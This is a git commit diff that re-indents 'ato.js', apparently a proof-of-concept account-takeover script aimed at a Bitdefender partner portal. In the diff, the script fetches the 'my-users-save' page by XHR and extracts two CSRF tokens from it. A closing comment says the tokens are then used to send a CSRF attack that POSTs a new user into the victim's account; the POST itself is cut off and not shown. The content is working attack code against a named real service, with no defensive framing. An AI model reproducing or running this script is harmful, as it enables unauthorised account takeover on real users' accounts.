77af6a33634cc1729b08f0d60c308ff3e8f3eb0b
naysser <77415898+naysser@users.noreply.github.com>
2023-01-20 23:51:48 +0100

    Update ato.js

--- ato.js
+++ ato.js
@@ -1,37 +1,37 @@
-// Handles the xhr response, parses the data, and extracts the CSRF token
-function readBody(xhr) {
-var data;
-let data1;
-if (!xhr.responseType || xhr.responseType === "text") {
-data = xhr.responseText;
-data1 = xhr.responseText;
-} else if (xhr.responseType === "document") {
-data = xhr.responseXML;
-data1 = xhr.responseXML;
-} else {
-data = xhr.response;
-data1 = xhr.response;
-}
+  // Handles the xhr response, parses the data, and extracts the CSRF token
+    function readBody(xhr) {
+        var data;
+        let data1;
+        if (!xhr.responseType || xhr.responseType === "text") {
+            data = xhr.responseText;
+            data1 = xhr.responseText;
+        } else if (xhr.responseType === "document") {
+            data = xhr.responseXML;
+            data1 = xhr.responseXML;    
+        } else {
+            data = xhr.response;
+            data1 = xhr.response;
+        }
 
-var parser = new DOMParser();
-var resp = parser.parseFromString(data, "text/html");
-var resp1 = parser.parseFromString(data1, "text/html");
-token = resp.getElementsByName("_Token[fields]")[0].value;
-key = resp1.getElementsByName("_csrfToken")[0].value;
-csrf(token,key);
-return [data, data1];
-}
+        var parser = new DOMParser();
+        var resp = parser.parseFromString(data, "text/html");
+        var resp1 = parser.parseFromString(data1, "text/html");
+        token = resp.getElementsByName("_Token[fields]")[0].value;
+        key = resp1.getElementsByName("_csrfToken")[0].value;
+        csrf(token,key);
+        return [data, data1];
+    }
 
-// Creates and sends the initial XHR request to the Users page: this is to obtain the CSRF token
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function () {
-if (xhr.readyState == 4) {
-response = readBody(xhr);
-}
-}
+    // Creates and sends the initial XHR request to the Users page: this is to obtain the CSRF token
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            response = readBody(xhr);
+        }
+    }
 
-xhr.open("GET", "https://pan.bitdefender.com/partners/my-users-save/", true);
-xhr.send(null);
+    xhr.open("GET", "https://pan.bitdefender.com/partners/my-users-save/", true);
+    xhr.send(null);
 
 
 // Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
